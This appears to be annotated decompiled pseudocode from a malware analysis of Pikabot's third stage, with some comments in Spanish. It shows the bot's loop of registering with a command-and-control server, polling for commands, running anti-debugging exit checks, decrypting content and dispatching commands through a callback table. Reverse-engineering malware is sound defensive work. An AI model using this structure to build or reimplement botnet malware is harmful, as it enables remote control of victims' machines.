void entrypoint {
  start_stage3(unused);
  return 0;
}

void start_stage3(undefined4 unused)
{
  int i;
  void *extraout_ECX;
  char *str;
  int *array_ptr;
  int pikabot_stage3_struct [106];
  
  // inicializar estructura principal a 0
  for (i = 0x69; i != 0; i = i + -1) {
    *pikabot_stage3_struct = 0;
    pikabot_stage3_struct = pikabot_stage3_struct + 1;
  }
  // guarda el array como global y establecce un hash global antes de entrar a una funcion
  _pikabot_struct = pikabot_stage3_struct;

  create_stage3_pikabot_struct();
  if (_pikabot_struct + 0x08 != 1) {
    create_victim_info();
    if (_pikabot_struct + 0x8 != 1) {
      start_comunication();
    }
  }
  return;
}

start_comunication()
{
  while( true )
  {
    if (*(int *)(_pikabot_struct + 0x140) == 0) { // registered Flag
      registerInC2(); 
      if (*(int *)(_pikabot_struct + 0x140) != 0) 
      {
        bot();
      }
    } else {
      bot();
    }
    blockProgram(0);
  }
}


void bot(void)
{
  content_size = 0;
  do {
    do {
      if (*(int *)(_pikabot_struct + 0x140) == 0) {
        return;
      }
      blockProgram(0);

      ret = request_command((int *)&resp_start, &resp_size);
      if (ret == 0) {
        ret = availableIPsExist();
        if (ret == 0) {
          call_exit_user_proc();
        }
      }
      ret = call_remoteDebuggerPresent();
      if (ret == 0x2500) {
        call_exit_user_proc();
      }
    } while ((resp_start == 0x0) || (resp_size == 0));

    create_mem_iterator_struct(mem_ptr, resp_start,resp_size);
    command = getNextVal((int)mem_ptr);

    content = (undefined *)getNextString((int)mem_ptr, &content_size);
    if (command != 0x164) {
      if (content_size != 0) {
        create_mem_iterator_struct(ptr2content, content, content_size);
        encrypt_and_shift_data_2((int)ptr2content);
      }

      // look for action and execute
      action_ptr = (int *)&DAT_0040f000; // DAT = action callback struct
      do {
        actionCallback = (code **)(action_ptr + 0x4);
        if (*actionCallback == (code *)0x0) goto ACTION_NOT_FOUND;

        action_code = *action_ptr;
        action_ptr = action_ptr + 0x8;

      } while (command != action_code);
      (**actionCallback)(ptr2content);
    }
ACTION_NOT_FOUND

    if (resp_start != (undefined *) 0x0) {
      // empty content
      fillContentWithVal((int)resp_start,0,resp_size);
      (**(code **)(_pikabot_struct + 0x58))(resp_start); // LocalFree
      resp_start = (undefined *)0x0;
    }

    resp_start = (undefined *)0x0;
    call_LocalFree(mem_ptr);
    call_LocalFree(ptr2content);
  } while( true );
}